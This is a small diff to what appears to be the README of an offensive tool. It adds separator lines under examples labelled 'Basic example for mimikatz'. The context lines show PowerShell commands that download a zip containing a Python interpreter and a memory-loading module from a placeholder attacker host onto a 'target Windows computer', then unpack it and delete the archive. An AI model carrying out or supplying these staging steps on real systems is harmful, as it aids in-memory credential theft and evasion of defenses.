@@ -35,6 +35,7 @@ Basic example for mimikatz
 1 - Download a Zip archive file on your target Windows computer that contains a signed portable Python 3 interpreter from 'www.python.org'
     as well as the Python 'MemoryModule' from the Github project 'https://github.com/naksyn/PythonMemoryModule'.
     Example:
+    --------
     PS C:\temp\python> wget -uri https://your-IP-or-website/python-3.10.4-with-MemoryModule.zip -OutFile C:\temp\python\python.zip
     PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;
 
@@ -57,6 +58,7 @@ Basic example for mimikatz
 1 - Download a Zip archive file on your target Windows computer that contains a signed portable Python 3 interpreter from 'www.python.org'
     as well as the 'PythonMemoryModule' from the Github project 'https://github.com/naksyn/PythonMemoryModule'.
     Example:
+    --------
     PS C:\temp\python> wget -uri https://your-IP-or-website/python-3.10.4-with-MemoryModule.zip -OutFile C:\temp\python\python.zip
     PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;
 
